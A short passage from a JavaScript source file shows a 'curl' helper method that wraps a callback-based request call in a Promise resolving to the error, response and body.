  },

  curl(options) {
    return new Promise(async (resolve) =>
      request(options, (error, response, body) =>
        resolve({
          error,
          response,
          body,
        })
      )
    );
  },
};
